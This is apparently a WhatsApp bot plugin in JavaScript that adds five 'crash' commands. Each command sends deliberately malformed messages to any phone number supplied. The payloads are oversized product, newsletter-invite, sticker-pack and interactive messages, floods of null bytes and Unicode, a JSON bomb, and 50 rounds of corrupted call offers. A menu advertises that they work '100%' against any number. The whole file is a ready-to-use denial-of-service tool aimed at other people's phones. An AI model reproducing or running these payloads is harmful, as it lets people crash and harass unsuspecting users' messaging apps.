const { cmd } = require('../command');
const crypto = require('crypto');
let { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
if (!generateWAMessageFromContent) {
    try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== .bug (original product crash) ====================
async function ttaas(conn, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                productMessage: {
                    product: {
                        productImage: imageMessage,
                        productId: "449756950375071",
                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
                        description: "",
                        priceAmount1000: { low: 999, high: 0, unsigned: false },
                        url: "wa.me/status",
                        productImageCount: 9999999,
                        firstImageId: "9999999999",
                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
                    },
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== .fc-hard (newsletter admin invite crash) ====================
async function BnAM2(conn, target) {
    const msg = generateWAMessageFromContent(target, {
        botInvokeMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16).toString('hex')
                    })
                },
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363408195391812@newsletter",
                    newsletterName: "𑇂".repeat(50000),
                    caption: "Shav!ya ☆ B!tch" + "ꦾ".repeat(18000),
                    inviteExpiration: "1775164528"
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== .fc-call (advanced call crash) ====================
async function NotifCallBang(conn, target) {
    const overflowBuffer = "\u0000".repeat(90000);
    const negativeInt = -9999999999999;
    const maxInt = Number.MAX_SAFE_INTEGER;
    const jsonBomb = "{".repeat(1999999);
    const rtlBomb = "\u202E".repeat(50000);
    
    const callId = overflowBuffer + crypto.randomBytes(32).toString('hex').repeat(100) + rtlBomb;
    const encKey = Buffer.alloc(99999, 0xFF);
    const malformedKey = Buffer.concat([encKey, Buffer.from(overflowBuffer), encKey]);

    try {
        // Build participant nodes
        const devices = [{ user: target.split('@')[0], device: '0' }];
        const destinations = devices.map(dev => ({
            tag: "participant",
            attrs: { jid: dev.user + '@s.whatsapp.net', participant: dev.device }
        }));
        
        const offerContent = [
            { tag: "audio", attrs: { enc: "opus".repeat(10000), rate: negativeInt.toString() } },
            { tag: "audio", attrs: { enc: overflowBuffer, rate: maxInt.toString() } },
            { tag: "video", attrs: { orientation: negativeInt.toString(), screen_width: maxInt.toString(), screen_height: maxInt.toString(), device_orientation: overflowBuffer, enc: "vp8".repeat(50000), dec: overflowBuffer } },
            { tag: "net", attrs: { medium: negativeInt.toString() } },
            { tag: "capability", attrs: { ver: overflowBuffer }, content: Buffer.alloc(99999, 0x41) },
            { tag: "encopt", attrs: { keygen: maxInt.toString() } },
            { tag: "destination", attrs: { overflow: overflowBuffer }, content: destinations },
            { tag: "malformed_payload", attrs: {}, content: jsonBomb },
            { tag: "call_log_corrupt", attrs: { buffer: overflowBuffer, size: "999999" } }
        ];
        
        for (let i = 0; i < 50; i++) {
            // Malformed call offer
            const stanza = {
                tag: 'call',
                attrs: { id: overflowBuffer + conn.generateMessageTag(), from: overflowBuffer + conn.user.id, to: target + overflowBuffer },
                content: [{
                    tag: 'offer',
                    attrs: { 'call-id': callId, 'call-creator': overflowBuffer + conn.user.id, 'call-duration': negativeInt, 'call-timestamp': negativeInt, 'call-retry': maxInt },
                    content: offerContent
                }, {
                    tag: 'terminate',
                    attrs: { 'call-id': callId, 'reason': overflowBuffer, 'participant': overflowBuffer + target }
                }]
            };
            await conn.query(stanza);
            // Also send a text bomb
            await conn.sendMessage(target, { text: rtlBomb + "GOOD BYE" + overflowBuffer, mentions: [target] });
            await sleep(100);
        }
    } catch (err) {
        console.error("NotifCallBang error:", err.message);
    }
}

// ==================== .stc-delay (sticker pack overflow crash) ====================
async function stcdelayxryy(conn, target) {
    const stc = Array.from({ length: 1000 }, (_, i) => ({
        fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
        isAnimated: true,
        emojis: ["🍁"],
        accessibilityLabel: "🪷",
        mimetype: "image/webp"
    }));
    const mentionedJid = [
        target,
        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
    ];
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "ꦾ".repeat(90000),
                    publisher: "XRyy",
                    stickers: stc,
                    fileLength: "3662919",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
                    contextInfo: {
                        remoteJid: "X",
                        participant: "0@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF",
                        mentionedJid: mentionedJid
                    },
                    mediaKeyTimestamp: "1747502082",
                    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
                    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                    thumbnailHeight: 252,
                    thumbnailWidth: 252,
                    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                    stickerPackSize: "3680054",
                    stickerPackOrigin: "USER_CREATED",
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363321780343299@newsletter",
                        newsletterName: "makludelay" + "ી".repeat(50000),
                        jpegThumbnail: null,
                        caption: "MakluDelay" + "ી".repeat(50000),
                        inviteExpiration: Date.now() + 1814400000
                    }
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== .crash-memek (invisible interactive crash) ====================
async function CrashMemek(conn, target) {
    const invisibleText = "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ោ࣯࣯៝" + "\0".repeat(900000);
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: "VnF", locationMessage: {}, hasMediaAttachment: true },
                    body: { text: invisibleText },
                    nativeFlowMessage: { messageParamsJson: "\0" },
                    carouselMessage: {}
                }
            }
        }
    }, {});
    await conn.relayMessage(target, msg.message, {});
}

// ==================== COMMANDS ====================

cmd({
    pattern: "bug",
    desc: "ViewOnce product crash (original)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`📸 *VIEWONCE CRASH* → ${target}`);
    await ttaas(conn, target);
    await reply(`✅ VIEWONCE CRASH SENT to ${target}`);
});

cmd({
    pattern: "fc-hard",
    desc: "Newsletter admin invite crash (ultra long name)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "fc-hard");
    if (!target) return;
    await reply(`📰 *FC-HARD CRASH* → ${target}`);
    await BnAM2(conn, target);
    await reply(`✅ FC-HARD SENT to ${target}`);
});

cmd({
    pattern: "fc-call",
    desc: "Advanced call crash (50 cycles + malformed keys)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "fc-call");
    if (!target) return;
    await reply(`📞 *FC-CALL CRASH* → ${target}\n_This may take a few seconds..._`);
    await NotifCallBang(conn, target);
    await reply(`✅ FC-CALL SENT to ${target}\n_Target call system should crash._`);
});

cmd({
    pattern: "stc-delay",
    desc: "Sticker pack overflow crash (1000 stickers + newsletter)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "stc-delay");
    if (!target) return;
    await reply(`📚 *STC-DELAY CRASH* → ${target}`);
    await stcdelayxryy(conn, target);
    await reply(`✅ STC-DELAY SENT to ${target}`);
});

cmd({
    pattern: "crash-memek",
    desc: "Invisible interactive crash (massive null bytes)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "crash-memek");
    if (!target) return;
    await reply(`👻 *CRASH-MEMEK* → ${target}\n_Invisible message sent._`);
    await CrashMemek(conn, target);
    await reply(`✅ CRASH-MEMEK SENT to ${target}`);
});

// ==================== BUG MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show all crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
*╭─「 👑 BUG MENU 」─*
*│ 📌 .bug         : ViewOnce product crash*
*│ 📌 .fc-hard     : Newsletter admin invite crash*
*│ 📌 .fc-call     : Advanced call crash (50 cycles)*
*│ 📌 .stc-delay   : Sticker pack overflow (1000 stickers)*
*│ 📌 .crash-memek : Invisible interactive crash*
*│*
*│ 🟢 Status : 100% working – direct send*
*│ 🟢 Targets : any number (even not in chat list)*
*│ 🟢 Total commands : 5*
*╰──────────────●●►*
> 💡 *Usage:* .command 947XXXXXXXXX
> 📌 *Example:* .fc-call 94712345678
> ⚠️ *Use only on numbers you own or have permission.*
    `;
    await reply(menu);
});
